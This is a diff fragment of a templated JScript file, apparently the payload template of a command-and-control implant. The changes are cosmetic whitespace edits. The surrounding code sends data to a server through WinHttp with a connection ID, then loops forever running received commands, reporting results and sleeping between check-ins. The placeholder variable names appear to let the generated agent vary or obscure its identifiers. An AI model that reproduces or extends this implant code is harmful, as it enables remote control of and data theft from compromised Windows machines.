@@ -16,7 +16,7 @@ function {{variables['post-req'][0]}}(data){
     {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("X-Frame-Options", "{{variables['x-frame-options'][1]}}");
     {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("Content-Type", "{{variables['content-type'][1]}}");
     {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("Connection-ID", "{{connection_id}}");
-    if(typeof(data) == 'string'){
+    if(typeof(data) == 'string') {
       {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("mimetype", "text/plain");
     } else {
       {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("mimetype", "application/octet-stream");
@@ -39,6 +39,7 @@ function kill(){
 try {
   results = '';
   while(true){
+
     // If there are results display them.
     if(results != ''){
       response = {{variables['post-req'][0]}}(results);
@@ -55,7 +56,7 @@ try {
         results = 'Failed to run ' + unescape(command) + ': ' + e.message;
       }
       WScript.Sleep({{variables['sleep'][0]}})
-    } catch (e){
+    } catch (e) {
       WScript.Sleep({{variables['sleep'][0]}})
       continue;
     }
